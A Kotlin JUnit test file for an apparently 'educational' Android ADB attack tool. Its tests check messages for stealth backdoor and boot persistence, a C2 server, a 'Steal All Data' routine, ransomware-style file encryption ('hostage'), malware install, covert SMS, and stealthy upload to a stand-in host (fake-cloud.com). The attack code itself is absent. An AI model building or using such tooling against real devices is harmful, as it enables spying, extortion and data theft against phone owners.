import org.junit.jupiter.api.Assertions.*
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.BeforeEach
import java.io.ByteArrayOutputStream
import java.io.PrintStream
import javax.crypto.SecretKey
import javax.crypto.spec.SecretKeySpec
import java.util.Base64

class MainTest {

    private val outputStreamCaptor = ByteArrayOutputStream()

    @BeforeEach
    fun setUp() {
        System.setOut(PrintStream(outputStreamCaptor))
    }

    @Test
    fun testMain() {
        main()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("ADB Interface (Educational Purposes Only)"))
    }

    @Test
    fun testDeviceStatus() {
        main()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Connected to ADB?"))
        assertTrue(output.contains("Device Rooted?"))
    }

    @Test
    fun testAvailableActions() {
        main()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Available actions:"))
        assertTrue(output.contains("1. Prepare Attack (Enable stealth, persistent access, start C2)"))
        assertTrue(output.contains("2. Steal All Data (to /sdcard/stolen_data)"))
        assertTrue(output.contains("3. Dump System Info (to /sdcard/system_info)"))
        assertTrue(output.contains("4. Simulate Hostage"))
        assertTrue(output.contains("5. Install Malware"))
        assertTrue(output.contains("6. Execute Shell Command"))
        assertTrue(output.contains("7. List Files"))
        assertTrue(output.contains("8. Pull File"))
        assertTrue(output.contains("9. Push File"))
        assertTrue(output.contains("10. Install APK"))
        assertTrue(output.contains("11. Uninstall App"))
        assertTrue(output.contains("12. Clear App Data"))
        assertTrue(output.contains("13. Reboot Device"))
        assertTrue(output.contains("14. Take Screenshot"))
        assertTrue(output.contains("15. Get Device Info"))
        assertTrue(output.contains("16. Read Logcat"))
        assertTrue(output.contains("17. Check Device Status"))
        assertTrue(output.contains("18. C2 - Start Server"))
        assertTrue(output.contains("19. C2 - Stop Server"))
        assertTrue(output.contains("0. Exit"))
    }

    @Test
    fun testPrepareAttack() {
        val adb = ADBBase()
        adb.prepareAttack()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Enabling stealth mode"))
        assertTrue(output.contains("Setting up TCP/IP on port"))
        assertTrue(output.contains("Fetching device IP"))
        assertTrue(output.contains("Installing backdoor service"))
        assertTrue(output.contains("Scheduling persistent task"))
        assertTrue(output.contains("Attempting boot persistence via BootReceiver"))
        assertTrue(output.contains("Listing files in /sdcard/Download"))
        assertTrue(output.contains("Starting C2 server"))
    }

    @Test
    fun testStealAllData() {
        val adb = ADBBase()
        val destination = "/sdcard/stolen_data"
        adb.exfiltrateData(destination)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Stealing all accessible data to: $destination"))
    }

    @Test
    fun testDumpSystemInfo() {
        val adb = ADBBase()
        val destination = "/sdcard/system_info"
        adb.dumpSystemInfo(destination)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Dumping system information to: $destination"))
    }

    @Test
    fun testHostage() {
        val adb = ADBBase()
        adb.hostage()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Files encrypted. Decryption key:"))
    }

    @Test
    fun testInstallMalware() {
        val adb = ADBBase()
        val apkPath = "path/to/malware.apk"
        adb.installMalware(apkPath)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Installing malware from: $apkPath"))
    }

    @Test
    fun testExecuteShellCommand() {
        val adb = ADBBase()
        val command = "ls /sdcard"
        val result = adb.executeMaliciousCommand(command)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Executing command: $command"))
        assertTrue(output.contains(result.output))
    }

    @Test
    fun testListFiles() {
        val adb = ADBBase()
        val path = "/sdcard/"
        val fileList = adb.listFiles(path)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Listing files in: $path"))
        assertTrue(output.contains(fileList))
    }

    @Test
    fun testPullFile() {
        val adb = ADBBase()
        val devicePath = "/sdcard/file.txt"
        val localPath = "local/file.txt"
        adb.pullFile(devicePath, localPath)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Pulling '$devicePath' to '$localPath'"))
    }

    @Test
    fun testPushFile() {
        val adb = ADBBase()
        val localPath = "local/file.txt"
        val devicePath = "/sdcard/file.txt"
        adb.pushFile(localPath, devicePath)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Pushing '$localPath' to '$devicePath'"))
    }

    @Test
    fun testInstallAPK() {
        val adb = ADBBase()
        val apkPath = "path/to/app.apk"
        adb.installApk(apkPath)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Installing APK from: $apkPath"))
    }

    @Test
    fun testUninstallApp() {
        val adb = ADBBase()
        val packageName = "com.example.app"
        adb.uninstallApp(packageName)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Uninstalling package: $packageName"))
    }

    @Test
    fun testClearAppData() {
        val adb = ADBBase()
        val packageName = "com.example.app"
        adb.clearAppData(packageName)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Clearing data for: $packageName"))
    }

    @Test
    fun testRebootDevice() {
        val adb = ADBBase()
        adb.rebootDevice()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Rebooting device"))
    }

    @Test
    fun testTakeScreenshot() {
        val adb = ADBBase()
        val filename = "screenshot.png"
        adb.takeScreenshot(filename)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Taking screenshot and saving as $filename"))
    }

    @Test
    fun testGetDeviceInfo() {
        val adb = ADBBase()
        val model = adb.getDeviceModel()
        val serial = adb.getDeviceSerialNumber()
        val androidVersion = adb.getAndroidVersion()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Device Information:"))
        assertTrue(output.contains("Model: $model"))
        assertTrue(output.contains("Serial: $serial"))
        assertTrue(output.contains("Android Version: $androidVersion"))
    }

    @Test
    fun testReadLogcat() {
        val adb = ADBBase()
        val logcatOutput = adb.readLogcat()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("--- Logcat Output ---"))
        assertTrue(output.contains(logcatOutput))
        assertTrue(output.contains("--- End of Logcat ---"))
    }

    @Test
    fun testCheckDeviceStatus() {
        val adb = ADBBase()
        val adbAccessible = adb.isAdbAccessible()
        val rooted = adb.isDeviceRooted()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("--- Device Status ---"))
        assertTrue(output.contains("ADB Accessible: $adbAccessible"))
        assertTrue(output.contains("Rooted: $rooted"))
        assertTrue(output.contains("--- End of Status ---"))
    }

    @Test
    fun testStartC2Server() {
        val adb = ADBBase()
        adb.startC2Server()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Starting C2 server"))
    }

    @Test
    fun testStopC2Server() {
        val adb = ADBBase()
        adb.stopC2Server()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Stopping C2 server"))
    }

    @Test
    fun testExtractTargetedContacts() {
        val adb = ADBBase()
        val keywords = listOf("John", "Doe")
        val contacts = adb.extractTargetedContacts(keywords)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Extracting contacts matching keywords"))
        assertTrue(output.contains(contacts))
    }

    @Test
    fun testSendStealthSMS() {
        val adb = ADBBase()
        val phoneNumber = "1234567890"
        val data = "Test message"
        adb.sendStealthSMS(phoneNumber, data)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Sending stealth SMS to $phoneNumber"))
    }

    @Test
    fun testUploadDataStealthily() {
        val adb = ADBBase()
        val data = "Sensitive data"
        val uploadUrl = "http://fake-cloud.com/upload"
        adb.uploadDataStealthily(data, uploadUrl)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Simulating data upload"))
    }

    @Test
    fun testDecryptFile() {
        val adb = ADBBase()
        val filePath = "/sdcard/encrypted_file.txt"
        val keyString = "your_base64_encoded_key_here"
        val keyBytes = Base64.getDecoder().decode(keyString)
        val key: SecretKey = SecretKeySpec(keyBytes, 0, keyBytes.size, "AES")
        adb.decryptFile(filePath, key)
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("File decrypted successfully"))
    }

    @Test
    fun testDetectUnauthorizedAttempts() {
        val adb = ADBBase()
        val unauthorized = adb.detectUnauthorizedAttempts()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Unauthorized attempt detected: $unauthorized"))
    }

    @Test
    fun testLogSimulationAttempt() {
        val adb = ADBBase()
        adb.logSimulationAttempt()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Hostage simulation attempt logged."))
    }

    @Test
    fun testDisableSimulation() {
        val adb = ADBBase()
        adb.disableSimulation()
        val output = outputStreamCaptor.toString().trim()
        assertTrue(output.contains("Hostage simulation disabled due to unauthorized attempts."))
    }
}
